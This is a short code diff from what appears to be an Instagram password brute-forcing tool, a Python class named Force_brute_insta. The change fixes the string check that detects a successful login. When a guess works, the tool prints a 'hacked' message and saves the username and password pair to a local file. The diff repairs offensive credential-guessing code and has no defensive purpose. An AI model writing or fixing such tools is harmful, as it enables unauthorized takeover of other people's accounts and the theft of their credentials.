@@ -236,7 +236,7 @@ class Force_brute_insta(object):
             })
             #print(f"{utilisateur}:{pwd}\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
             print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m :\033[1;93m " + pwd + "\033[1;97m\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
-            if "authenticated": true" in _reqs.text:
+            if "authenticated': true" in _reqs.text:
                 print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m: \033[1;96m" + pwd + "\033[1;91m -->\033[1;97m Bien pirater")
                 with open("faxelm.txt", "a") as saves:
                     saves.write("#Faxel\n" + utilisateur + ":" + pwd + "\n")
